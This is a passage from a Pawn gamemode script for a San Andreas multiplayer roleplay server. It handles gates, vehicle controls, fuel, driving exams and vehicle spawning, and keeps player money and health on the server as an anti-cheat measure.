                if (PlayerToPoint(10.0, playerid, -1636.33142, 688.33667, 8.89540) && gateopen21 == 0)
                {
					MoveObject(sfpdgate2, -1645.67871, 688.23499, 8.89564, 5);
					SetTimer("sfpdgate2T" ,3000 ,false);
					gateopen21 = 1;
                }
            }
          if(PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 8)
        {
   if (PlayerToPoint(10.0, playerid, 1021.2133, -377.7204, 74.7619))   {
        MoveObject(obj5, 1021.2133, -377.7204, 80.3642, 5.00);
        SetTimer("obj5T" ,3000 ,false);
        gateopen15 = 1;
    }
 }
        }
    }// LegendaryMenhqq
    /*if(PRESSED(KEY_ANALOG_RIGHT) && ServerObG == true)
    {
        new Float:ui[3];
        GetObjectPos(ServerObj, ui[0], ui[1], ui[2]);
        DestroyObject(ServerObj);
        ServerObj = CreateObject(ObjModelid+1, ui[0], ui[1], ui[2], 0, 0, 0);
        ObjModelid ++;
        new strfuck[256];
        format(strfuck, 256, "%i", ObjModelid);
        GameTextForAll(strfuck, 1500, 6);
    }
    if(PRESSED(KEY_ANALOG_LEFT) && ServerObG == true)
    {
        new Float:ui[3];
        GetObjectPos(ServerObj, ui[0], ui[1], ui[2]);
        DestroyObject(ServerObj);
        ServerObj = CreateObject(ObjModelid-1, ui[0], ui[1], ui[2], 0, 0, 0);
        ObjModelid --;
        new strfuck[256];
        format(strfuck, 256, "%i", ObjModelid);
        GameTextForAll(strfuck, 1500, 6);
    }*/
    if ((PRESSED( KEY_ANALOG_UP ))&&(IsPlayerInAnyVehicle(playerid))&&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
        new vid = GetPlayerVehicleID(playerid);
        if(bonnetSTATE[vid] == 0)
        {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,engine,lights,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
                bonnetSTATE[vid] = 1;
        }
        else
        {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
                bonnetSTATE[vid] = 0;
        }
    }
    if ((PRESSED( KEY_ANALOG_DOWN ))&&(IsPlayerInAnyVehicle(playerid))&&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
        new vid = GetPlayerVehicleID(playerid);
        if(vid != FBIVeh[13] && vid != FBIVeh[14] && vid != CopLSVeh[27] && vid != CopLSVeh[28])
        {
            if(bootSTATE[vid] == 0)
            {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
                bootSTATE[vid] = 1;
            }
            else
            {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
                bootSTATE[vid] = 0;
            }
        }
    }

    if ((PRESSED( KEY_ACTION ))&&(IsPlayerInAnyVehicle(playerid))&&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
        if (IsPlayerInVehicle(playerid, tcc1) || IsPlayerInVehicle(playerid, tcc2) || IsPlayerInVehicle(playerid, tcc3) || IsPlayerInVehicle(playerid, tcc4) || IsPlayerInVehicle(playerid, tcc5))
        {
            new Float:pX,Float:pY,Float:pZ;
            GetPlayerPos(playerid,pX,pY,pZ);
            new Float:vX,Float:vY,Float:vZ;
            new Found=0;
            new vid=0;
            while((vid<MAX_VEHICLES)&&(!Found))
            {
                vid++;
                GetVehiclePos(vid,vX,vY,vZ);
                if  ((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0)&&(floatabs(pZ-vZ)<7.0)&&(vid!=GetPlayerVehicleID(playerid)))
                {
                    Found=1;
                    if  (IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
                    {
                        DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
                    }
                    AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
                    SendClientMessage(playerid,COLOR_GRAD4,"** Car towed.");
                }
            }
            if  (!Found)
            {
                SendClientMessage(playerid,COLOR_WHITE,"** There is no car in range.");
            }
        }

        if ((PRESSED( KEY_SUBMISSION ))&&(IsPlayerInAnyVehicle(playerid))&&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
        new vid1 = GetPlayerVehicleID(playerid);
        if(vid1 != FBIVeh[13] && vid1 != FBIVeh[14] && vid1 != CopLSVeh[27] && vid1 !=CopLSVeh[28])
        {
            if(bootSTATE[vid1] == 0)
            {
                GetVehicleParamsEx(vid1,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid1,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
                bootSTATE[vid1] = 1;
            }
            else
            {
                GetVehicleParamsEx(vid1,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid1,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
                bootSTATE[vid1] = 0;
            }
        }
    }
    }
    return 1;
}
stock ResetPlayerTofang(playerid)
{
	ResetPlayerWeapons(playerid);
	SetTimerEx("ResetGuns",100, false, "i", playerid);
}
Public:ResetGuns(playerid)
{
	for(new x = 0; x < MAX_PLAYERS; x++)
	{
		AC_pWeapons[playerid][x] =0;
	}
}
Public:GiveDutyGuns(playerid)
{
	AC_pWeapons[playerid][24] =1;
	AC_pWeapons[playerid][3] =1;
	GivePlayerTofang(playerid, 24, 200);
	GivePlayerTofang(playerid, 3, 1);
}
Public:GiveNewsCamera(playerid)
{
	GivePlayerTofang(playerid,43,50);
	AC_pWeapons[playerid][43] =1;
}
stock GivePlayerTofang(playerid, Gun, Ammo)
{
	AC_pWeapons[playerid][Gun] =1;
	SetTimerEx("GiveGuns",100, false, "iii", playerid,Gun,Ammo);
	return 1;
}
Public:GiveGuns(playerid,Weapon,Ammo)
{
    GivePlayerWeapon(playerid, Weapon, Ammo);
}
stock CheckPlayerDistanceToVehicle(Float:radi, playerid, vehicleid)
{
    if(IsPlayerConnected(playerid))
    {
        new Float:PX,Float:PY,Float:PZ,Float:X,Float:Y,Float:Z;
        GetPlayerPos(playerid,PX,PY,PZ);
        GetVehiclePos(vehicleid, X,Y,Z);
        new Float:Distance = (X-PX)*(X-PX)+(Y-PY)*(Y-PY)+(Z-PZ)*(Z-PZ);
        if(Distance <= radi*radi)
        {
            return 1;
        }
    }
    return 0;
}
//-----------------------------------------------------
public Float:GetDistance(playerid, Float:x, Float:y)
{
    new Float:x2, Float:y2, Float:z2;
    GetPlayerPos(playerid, x2, y2, z2);
    x = x - x2;
    y = y - y2;
    return floatsqroot(x*x+y*y);
}

forward towtime(playerid);
public towtime(playerid)
{
  towtimer[playerid] = 0;
}
forward pbvotet(playerid);
public pbvotet(playerid)
{
	ShowPlayerDialog(playerid, -1, DIALOG_STYLE_MSGBOX, " ", " ", " ", " ");//space added
	OnPaintBall[playerid] = 1;
    ResetPlayerTofang(playerid);
    SetPlayerKhoon(true, playerid,100);
    SetSpawnKol(playerid);
    SpawnPlayer(playerid);
    GivePlayerPool(playerid,-SBizzInfo[10][sbEntranceCost]);
}


 forward SafeFreeze(playerid);
 public SafeFreeze(playerid)
{
  TogglePlayerControllable(playerid, 1);
}

forward spraytime(playerid);
public spraytime(playerid)
{
  SetPlayerVirtualWorld(playerid, 0)
  new carid = GetPlayerVehicleID(playerid);
  SetVehicleVirtualWorld(carid, 0);
  SetVehiclePos(carid, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
  SetVehicleZAngle(carid, ZAng[playerid]);
  ChangeVehicleColor(carid, vhcolor1[playerid], vhcolor2[playerid]);
	     for( new i = 0; i<Akharish; i++ )
		{
		if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i))
		{
		if(GetPlayerVehicleID(i) == carid)
		{
	   if(GetPlayerVehicleSeat(i) == 0)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 0);
	    }
	    else if(GetPlayerVehicleSeat(i) == 1)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 1);
	    }
	    else if(GetPlayerVehicleSeat(i) == 2)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 2);
	    }
	    else if(GetPlayerVehicleSeat(i) == 3)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 3);
	    }
	    else if(GetPlayerVehicleSeat(i) == 4)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 4);
	    }
	    else if(GetPlayerVehicleSeat(i) == 5)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 5);
	    }
	    else if(GetPlayerVehicleSeat(i) == 6)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 6);
	    }
	    else if(GetPlayerVehicleSeat(i) == 7)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 7);
	    }
	    else if(GetPlayerVehicleSeat(i) == 8)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 8);
	    }
	    else if(GetPlayerVehicleSeat(i) == 9)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 9);
	    }
	    else if(GetPlayerVehicleSeat(i) == 10)
		{
	    SetPlayerVirtualWorld(i, 0);
	    PutPlayerInVehicle(i, carid, 10);
	    }
	    }
	    }
	    }

}
public warnt(playerid)
{
  warntime[playerid] = 0;
}

//------------------------------------------------------------------------------------
public GateTime()
{
    MoveObject(barrierls, 1544.69641113,-1630.79003906,13.00000000, 0.001, 0.0, 90.0, 90);
    gateopen1 = 0;
    return 1;
}
public GateTime1()
{
    MoveObject(barrierlv, 2238.16210938,2450.41113281,10.71316910, 0.001, 0.0, 89.0, 90.0);
    gateopen2 = 0;
    return 1;
}
public GarageLS()
{
    MoveObject(garagels, 1588.3868,-1638.2165,13.7, 5);
    gateopen3 = 0;
    return 1;
}
public areagate1()
{
MoveObject(area1gate1,321.321075, 1897.642333, 16.636323,5,0.000000, 0.000000, 270.000000);
MoveObject(area2gate1,321.321075, 1897.642333, 19.806344,5,0.000000, 0.000000, 270.000000);
MoveObject(area3gate1,321.321075, 1897.642333, 22.946380,5,0.000000, 0.000000, 270.000000);
gateopen4 = 0;
return 1;
}
public areagate2()
{
MoveObject(area1gate2,81.349678, 1922.567382, 16.657611,5,0.000000, 0.000000, 90.000000);
MoveObject(area2gate2,81.349678, 1913.806518, 16.657611,5,0.000000, 0.000000, 90.000000);
gateopen5 = 0;
return 1;
}
public areagate3()
{
MoveObject(area1gate3,81.348129, 2063.251464, 16.505308,5,0.000000, 0.000000, 90.000000);
MoveObject(area2gate3,81.348129, 2072.024902, 16.505308,5,0.000000, 0.000000, 90.000000);
gateopen6 = 0;
return 1;
}
public areagate()
{
MoveObject(AreaGate,209.79103, 1875.28442, 12.13354,4.1,0,0,0);
gateopen7 = 0;
return 1;
}
public GarageLV()
{
    MoveObject(garagelv, 2335.28149414,2444.17993164,6.96999979, 5);
    gateopen8 = 0;
    return 1;
}
public GarageLV1()
{
    MoveObject(garagelv1, 2294.00000000,2498.59155273,4.50000000, 5);
    gateopen9 = 0;
    return 1;
}
public TTgateT()
{
    MoveObject(TTgate, 2223.2632, -1141.1239, 28.3421, 5);
    gateopen10 = 0;
    return 1;
}
public EVgateT()
{
    MoveObject(EVgate, 2184.15991, -1762.50024, 14.65228, 5);
    gateopen22 = 0;
    return 1;
}
public JailXT()
{
    MoveObject(JailX, 1764.49976, -1547.03247, 2004.02783, 5);
    gateopen23 = 0;
    return 1;
}
public LStoLV(playerid)
{
    SetPlayerPosEx(playerid,1705.852172,1438.773559,10.763327);
	SetPlayerInterior(playerid,0);
    return 1;
}
public LStoSF(playerid)
{
    SetPlayerPosEx(playerid,-1407.912963,-308.195220,14.148437);
	SetPlayerInterior(playerid,0);
    return 1;
}
public LVtoLS(playerid)
{
    SetPlayerPosEx(playerid,1642.647705,-2248.739746,13.488468);
	SetPlayerInterior(playerid,0);
    return 1;
}
public LVtoSF(playerid)
{
    SetPlayerPosEx(playerid,-1407.912963,-308.195220,14.148437);
	SetPlayerInterior(playerid,0);
    return 1;
}
public SFtoLV(playerid)
{
    SetPlayerPosEx(playerid,1705.852172,1438.773559,10.763327);
	SetPlayerInterior(playerid,0);
    return 1;
}
public SFtoLS(playerid)
{
    SetPlayerPosEx(playerid,1642.647705,-2248.739746,13.488468);
	SetPlayerInterior(playerid,0);
    return 1;
}
public blT1()
{
    MoveObject(Balsys1, 321.793060,-1630.432128,100.143329, 10);
    balsys1 = 1;
	SetTimer("blT2" ,7000 ,false);
    return 1;
}
public blT2()
{
    MoveObject(Balsys1, 515.723449,-1418.986694,90.963569, 10);
    balsys1 = 1;
	SetTimer("blT3" ,22000 ,false);
    return 1;
}
public blT3()
{
    MoveObject(Balsys1, 1363.746337,-1036.938964,120.140625, 10);
    balsys1 = 1;
	SetTimer("blT4" ,110000 ,false);
    return 1;
}
public blT4()
{
    MoveObject(Balsys1, 303.965179,-1901.703857,120.574748, 10);
    balsys1 = 1;
	SetTimer("blT5" ,100000 ,false);
    return 1;
}
public blT5()
{
    MoveObject(Balsys1, 303.965179,-1901.703857,0.574748, 10);
    balsys1 = 0;
    return 1;
}
public bl2T1()
{
    MoveObject(Balsys2, 1249.162231,-1545.500366,100.143329, 10);
    balsys2 = 1;
	SetTimer("bl2T2" ,90000 ,false);
    return 1;
}
public bl2T2()
{
    MoveObject(Balsys2, 1457.649780,-1514.878295,90.963569, 10);
    balsys2 = 1;
	SetTimer("bl2T3" ,22000 ,false);
    return 1;
}
public bl2T3()
{
    MoveObject(Balsys2, 1449.684082,-1138.769653,120.140625, 10);
    balsys2 = 1;
	SetTimer("bl2T4" ,34000 ,false);
    return 1;
}
public bl2T4()
{
    MoveObject(Balsys2, 1192.949218,-722.294372,120.574748, 10);
    balsys2 = 1;
	SetTimer("bl2T5" ,40000 ,false);
    return 1;
}
public bl2T5()
{
    MoveObject(Balsys2, 326.079589,-1832.628906,120.834218, 10);
    balsys2 = 1;
	SetTimer("bl2T6" ,100000 ,false);
    return 1;
}
public bl2T6()
{
    MoveObject(Balsys2, 271.637725,-1897.869995,0.361719, 10);
    balsys2 = 0;
    return 1;
}
public sfpdgate1T()
{
    MoveObject(sfpdgate1, -1624.76929, 688.32880, 8.89564, 5);
    gateopen20 = 0;
    return 1;
}
public sfpdgate2T()
{
    MoveObject(sfpdgate2, -1636.33142, 688.33667, 8.89564, 5);
    gateopen21 = 0;
    return 1;
}
public obj5T()
{
    MoveObject(obj5, 1021.22833, -377.68338, 74.76195, 5.00);
    gateopen15 = 0;
    return 1;
}
FormatNumber(number)
{
   new Str[15];
   format(Str, 15, "%d", number);

   if (strlen(Str) < sizeof(Str))
   {
      if (number >= 1000 && number < 10000)
             strins( Str, ",", 1, sizeof(Str));

      else if (number >= 10000 && number < 100000)
           strins(Str, ",", 2, sizeof(Str));

      else if (number >= 100000 && number < 1000000)
           strins(Str, ",", 3, sizeof(Str));

      else if (number >= 1000000 && number < 10000000)
           strins(Str, ",", 1, sizeof(Str)),strins(Str, ",", 5, sizeof(Str));

      else if (number >= 10000000 && number < 100000000)
           strins(Str, ",", 2, sizeof(Str)),strins(Str, ",", 6, sizeof(Str));

      else if (number >= 100000000 && number < 1000000000)
           strins(Str, ",", 3, sizeof(Str)),strins(Str, ",", 7, sizeof(Str));

      else if (number >= 1000000000 && number < 10000000000)
           strins(Str, ",", 1, sizeof(Str)),
           strins(Str, ",", 5, sizeof(Str)),
           strins(Str, ",", 9, sizeof(Str));
      else format(Str, 10, "%d", number);
   }
   else  format( Str, 15, "<BUG>" );
   return Str;
}
FormatPhoneNumber(number)
{
   new STR[16];
   format(STR, 15, "%d", number);
   if (strlen(STR) < sizeof(STR))
   {
   strins( STR, "-", 3, sizeof(STR));
   }
   else  format( STR, 15, "<BUG>" );
   return STR;
}
stock soratbegirs(vehicleid)
{
    new Float:speed_x,Float:speed_y,Float:speed_z,Float:final_speed,final_speed_int;
GetVehicleVelocity(vehicleid,speed_x,speed_y,speed_z);
        final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y)))*180.0;
        final_speed_int = floatround(final_speed,floatround_round);
        return final_speed_int;
}
forward benzinkamkon();
public benzinkamkon()
{
	for(new i = 0; i < LastPID; i++)
	{
		new Fuel_string[256],vehicle = GetPlayerVehicleID(i),soratemanobegir = soratbegirs(vehicle);
		if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			if(Benzin[vehicle] >= 15) format(Fuel_string,256,"Benzin: ~g~%i%",Benzin[vehicle]);
			if(Benzin[vehicle] <= 14) format(Fuel_string,256,"Benzin: ~r~%i%",Benzin[vehicle]);
			TextDrawSetString(FuelTextDraw[i], Fuel_string);
			if(EngineSTATE[vehicle] == 1)
			{
				if(IsAPlane(vehicle) || IsAHarvest(vehicle) || IsAHarvest2(vehicle) || IsABike(vehicle) || IsAGangCar8(vehicle)) TextDrawSetString(FuelTextDraw[i], "Benzin: ~g~100%");
				else
				{
					if(soratemanobegir <= 100)
					{
						DarsadBenzin[vehicle] ++;
						if(DarsadBenzin[vehicle] >= 20 && Benzin[vehicle] != 0) { DarsadBenzin[vehicle] = 0;  Benzin[vehicle] --; }
					}
					if(soratemanobegir >= 101 && soratemanobegir <= 180)
					{
						DarsadBenzin[vehicle] ++;
						if(DarsadBenzin[vehicle] >= 15 && Benzin[vehicle] != 0) { DarsadBenzin[vehicle] = 0;  Benzin[vehicle] --; }
					}
					if(soratemanobegir >= 181)
					{
						DarsadBenzin[vehicle] ++;
						if(DarsadBenzin[vehicle] >= 7 && Benzin[vehicle] != 0) { DarsadBenzin[vehicle] = 0;  Benzin[vehicle] --; }
					}
				}
				if(Benzin[vehicle] == 0)
				{
						SCM(i,COLOR_LIGHTGREEN,"Benzin Mashin Tamam Shod. Ba Mechanic Tamams Begirid [/Service Mechanic] Ya Gas Can Kharidari Konid.");
                        GetVehicleParamsEx(vehicle,engine,lights,alarm,doors,bonnet,boot,objective);
                        SetVehicleParamsEx(vehicle,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
                        EngineSTATE[vehicle] = 0;
				}
			}
		}
	}
	return 0;
}

forward FindBadSign(string[]);
public FindBadSign(string[])
{
    for(new i; i < strlen(string); i++)
    {
        switch(string[i])
        {
            case 0x30..0x39: continue; //[0-9]
            case 0x41..0x5A: continue; //[A-Z]
            case 0x61..0x7A: continue; //[a-z]
            case '_', '[', ']', '(', ')': continue;
            default: return 1;
        }
    }
    return 0;
}
public OnPlayerExitVehicle(playerid, vehicleid)
{
	new ID=GetVehicleModel(vehicleid);
	if(ID == 417 || ID == 425 || ID == 447 || ID == 460 || ID == 469 || ID == 476 || ID == 487 || ID == 488 || ID == 497 || ID == 511 ||
	ID == 512 || ID == 513 || ID == 519 || ID == 520 || ID == 548 || ID == 553 || ID == 563 || ID == 577 || ID == 592 || ID == 593) GivePlayerTofang(playerid,46,-1);
    for(new i;i < LastPID;i++)
    {
        if(IsPlayerConnected(i))
        {
            if(OnEnteringVehPlay[i] == playerid)
            {
                OnEnteringVehPlay[i] = INVALID_PLAYER_ID;
                OnEnteringVeh[i] = 0;
            }
        }
    }




	if(TakingLesson[playerid] == 1)
	{
		SetVehicleToRespawn(vehicleid);
		TakingLesson[playerid] =0;
		DisablePlayerRaceCheckpoint(playerid);
		OnCheckpoint[playerid] = 0;
		if(PlayerInfo[playerid][pLanguage] == 2) SCM(playerid, COLOR_LIGHTBLUE, "Exam: You exited the Exam car and losted on exam test!");
		if(PlayerInfo[playerid][pLanguage] == 1) SCM(playerid,COLOR_LIGHTBLUE, "EXAM: To Az Mashin Piade Shodi Va Emtehan Ro Rad Shodi.");
		RCP[playerid] = 0;
		TextDrawHideForPlayer(playerid,TD_Exam[playerid][0]);
		TextDrawHideForPlayer(playerid,TD_Exam[playerid][1]);
		TextDrawHideForPlayer(playerid,TD_Exam[playerid][2]);
	}
	return 1;
}
stock PutPlayerInExamVehicle( playerid )
{
    new bool: lbExamVehicleOcc[ 8 ];

    for( new i = 0; i < LastPID; i ++ )
    {
        for( new ii = 0; ii < sizeof(ExamVeh); ii ++ )
        {
            if( lbExamVehicleOcc[ ii ] == false )
            {
                if( IsPlayerInVehicle( i, ExamVeh[ ii ] ) && GetPlayerState( i ) == PLAYER_STATE_DRIVER )
				{
                    lbExamVehicleOcc[ ii ] = true;
				}
			}
		}
	}
    for( new ii = 0; ii < sizeof ExamVeh; ii ++ )
    {
        if( lbExamVehicleOcc[ ii ] == false )
        {
            PutPlayerInVehicle( playerid, ExamVeh[ ii ], 0 );
            return 1;
        }
    }
    return 1;
}
public OnVehicleSpawn(vehicleid)
{
	vHealth[vehicleid] =1000.0;
    LinkVehicleToInterior(vehicleid, 0);
    SetVehicleVirtualWorld(vehicleid, 0);
    CarRadio[vehicleid][0] = '\0';
    LockEngine[vehicleid] = false;
    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
    EngineSTATE[vehicleid] = 0;
    LightsSTATE[vehicleid] = 0;
    bonnetSTATE[vehicleid] = 0;
    bootSTATE[vehicleid] = 0;
    SetVehicleHealthEx(vehicleid, 1000.0);
    if(OwnedMashin[vehicleid] != 1 && OwnedMashin_2[vehicleid] != 1) Benzin[vehicleid] = 100;
    if(OwnedMashin[vehicleid] == 1)
    {
        if(PlayerInfo[MashinOwner[vehicleid]][cHealth] <= 249.9)
        {
            PlayerInfo[MashinOwner[vehicleid]][cHealth] = 1000.0;
            SaveKonFloat(MashinOwner[vehicleid], "cHealth", 1000);
            if(PINFO[MashinOwner[vehicleid]][cInsurance] <= 0)
            {
                PINFO[MashinOwner[vehicleid]][cFixed] = 0;
                SaveKonVal(MashinOwner[vehicleid], "cFixed", 0);
            }
            else
            {
                PINFO[MashinOwner[vehicleid]][cInsurance] --;
                SaveKonVal(MashinOwner[vehicleid], "cInsurance", PINFO[MashinOwner[vehicleid]][cInsurance]);
            }
            //SaveAccount(MashinOwner[vehicleid]);
        }
        SetVehicleHealthEx(vehicleid,PlayerInfo[MashinOwner[vehicleid]][cHealth]);
        ModVehicle(MashinOwner[vehicleid],PlayerInfo[MashinOwner[vehicleid]][pCar]);
        ChangeVehicleColor(vehicleid,PlayerInfo[MashinOwner[vehicleid]][cColor1],PlayerInfo[MashinOwner[vehicleid]][cColor2]);
        ModVehicle(MashinOwner[vehicleid],PlayerInfo[MashinOwner[vehicleid]][pCar]);
        UpdateVehicleDamageStatus(vehicleid,PINFO[MashinOwner[vehicleid]][cPanel],PINFO[MashinOwner[vehicleid]][cDoors],PINFO[MashinOwner[vehicleid]][cLights],PINFO[MashinOwner[vehicleid]][cTires]);
        GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
        for(new AP = 0;AP<LastPID;AP++)
        {
            if(IsPlayerConnected(AP))
            {
                SetVehicleParamsForPlayer(vehicleid,AP,objective,PINFO[MashinOwner[vehicleid]][cLock]);
            }
        }
    }
    else if(OwnedMashin_2[vehicleid] == 1)
    {
        if(PlayerInfo[MashinOwner_2[vehicleid]][cHealth_2] <= 249.9)
        {
            PlayerInfo[MashinOwner_2[vehicleid]][cHealth_2] = 1000.0;
            SaveKonFloat(MashinOwner_2[vehicleid], "cHealth_2", 1000);
            if(PINFO[MashinOwner_2[vehicleid]][cInsurance_2] <= 0)
            {
                PINFO[MashinOwner_2[vehicleid]][cFixed_2] = 0;
                SaveKonVal(MashinOwner_2[vehicleid], "cFixed_2", 0);
            }
            else
            {
                PINFO[MashinOwner_2[vehicleid]][cInsurance_2] --;
                SaveKonVal(MashinOwner_2[vehicleid], "cInsurance_2", PINFO[MashinOwner_2[vehicleid]][cInsurance_2]);
            }
            //SaveAccount(MashinOwner_2[vehicleid]);
        }
        SetVehicleHealthEx(vehicleid,PlayerInfo[MashinOwner_2[vehicleid]][cHealth_2]);
        ModVehicle(MashinOwner_2[vehicleid],PlayerInfo[MashinOwner_2[vehicleid]][pCar_2]);
        ChangeVehicleColor(vehicleid,PlayerInfo[MashinOwner_2[vehicleid]][cColor1_2],PlayerInfo[MashinOwner_2[vehicleid]][cColor2_2]);
        ModVehicle(MashinOwner_2[vehicleid],PlayerInfo[MashinOwner_2[vehicleid]][pCar_2]);
        UpdateVehicleDamageStatus(vehicleid,PINFO[MashinOwner_2[vehicleid]][cPanel_2],PINFO[MashinOwner_2[vehicleid]][cDoors_2],PINFO[MashinOwner_2[vehicleid]][cLights_2],PINFO[MashinOwner_2[vehicleid]][cTires_2]);
        GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
        for(new AP = 0;AP<LastPID;AP++)
        {
            if(IsPlayerConnected(AP))
            {
                SetVehicleParamsForPlayer(vehicleid,AP,objective,PINFO[MashinOwner_2[vehicleid]][cLock_2]);
            }
        }
    }
    if(MashinRenter[vehicleid] != INVALID_PLAYER_ID)
    {
        gCarLock[vehicleid] = 0;
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                SetVehicleParamsForPlayer(vehicleid, i, 0, 0);
            }
        }
        RentedVehicle[MashinRenter[vehicleid]] = INVALID_VEHICLE_ID;
        MashinRenter[vehicleid] = INVALID_PLAYER_ID;
    }
    SetVehicleSoratLimit(vehicleid, 0);
    return 1;
}

forward KickPublic(plyid);
public KickPublic(plyid) { Kick(plyid); }

stock KickWithMessage(plyid, color, message[])
{
    if(IsPlayerConnected(plyid))
    {
        SendClientMessage(plyid, color, message);
        SetTimerEx("KickPublic", 50, 0, "i", plyid);
    }
    return 1;
}
Public:HealthKamKon(playerid)
{
	if(HealthAllowedForPlayer[playerid] == 1 && GodmodeFeature[playerid] == false && AFK[playerid] == 0) SetPlayerKhoon(true, playerid,Khoon[playerid]-1);
	return 1;
}
public RandomShomare(min,max)
{
    new rand;
    rand = random(max-min+1)+min;
    return rand;
}
/*-------------------------Anti Money hack------------------------------------*/
new Pool[MAX_PLAYERS];

stock SetVehicleHealthEx(vehicleid,Float:vHp)
{
	vHealth[vehicleid] =vHp;
    SetVehicleHealth(vehicleid,vHp)
}
stock RepairVehicleEx(vehicleid)
{
	vHealth[vehicleid] =1000.0;
    RepairVehicle(vehicleid);
}
stock GivePlayerPool(playerid, money)
{
    Pool[playerid] += money;
    ResetPlayerMoney(playerid);
    GivePlayerMoney(playerid,Pool[playerid]);
    SaveKonVal(playerid, "pCash", Pool[playerid]);
    return Pool[playerid];
}
stock GetPlayerPool2(playerid, money)
{
    Pool[playerid] -= money;
    ResetPlayerMoney(playerid);
    GivePlayerMoney(playerid,Pool[playerid]);
    SaveKonVal(playerid, "pCash", Pool[playerid]);
    return Pool[playerid];
}
stock SetPlayerPool(playerid, money)
{
    Pool[playerid] = money;
    ResetPlayerMoney(playerid);
    GivePlayerMoney(playerid,Pool[playerid]);
    SaveKonVal(playerid, "pCash", Pool[playerid]);
    return Pool[playerid];
}
stock ResetPlayerPool(playerid)
{
    Pool[playerid] = 0;
    ResetPlayerMoney(playerid);
    GivePlayerMoney(playerid,Pool[playerid]);
    SaveKonVal(playerid, "pCash", Pool[playerid]);
    return Pool[playerid];
}
stock GetPlayerPool(playerid)
{
    return Pool[playerid];
}
/*------------------ServerSide Health hack------------------------------------*/
stock SetPlayerKhoon(bool:SetKon, playerid, Float:khoon)
{
    if(khoon < 0) Khoon[playerid] = 0;
    else Khoon[playerid] = khoon;
    if(Khoon[playerid] < 0) Khoon[playerid] = 0;
    if(SetKon == true) SetPlayerHealth(playerid, khoon);
    if(Khoon[playerid] <= 0)
    {
        if(PlayerOnDeathing[playerid] == false)
        {
            if(PlayDeathingCamera[playerid] == false) SetPlayerHealth(playerid, 0);
        }
    }
    return 1;
}
forward KhoonTimer(playerid);
public KhoonTimer(playerid)
{
	if(IsPlayerConnected(playerid) && PlayDeathingCamera[playerid] == false)
	{
		new Float:H;
		GetPlayerHealth(playerid,H);
		if(Khoon[playerid] < H) SetPlayerKhoon(true, playerid, Khoon[playerid]);
    }
}
stock SetPlayerPosEx(playerid,Float:X,Float:Y,Float:Z)
{
	AirTime[playerid] =2;
	SetPlayerPos(playerid,X,Y,Z)
}
stock SetPlayerZereh(playerid, Float:zereh)
{
	Zereh[playerid] = zereh;
	SetPlayerArmour(playerid,zereh);
}
forward ArmourTimer();
public ArmourTimer()
{
	for(new i = 0; i < LastPID; i++ )
	{
		if(IsPlayerConnected(i))
		{
			SetPlayerArmour(i,Zereh[i]);
		}
	}
}
/*forward ArmourTimer();
public ArmourTimer()
{
	for(new i = 0; i < LastPID; i++ )
	{
if(IsPlayerConnected(i))
        {
new Float:A;
GetPlayerArmour(i, A);
if(Zereh[i] < A)
{
SetPlayerZereh(i, Zereh[i]);
}
}
}
}*/
//----------------------------------------------------------------------------//
public OnVehicleStreamOut(vehicleid, forplayerid)
{
    return 1;
}
public OnVehicleStreamIn(vehicleid, forplayerid)
{


    if(IsSpecialVeh(vehicleid))
    {

        if(!IsACop(forplayerid))
        {
            SetVehicleParamsForPlayer(vehicleid,forplayerid,0,1);
        }
        else
        {
            SetVehicleParamsForPlayer(vehicleid,forplayerid,0,0);
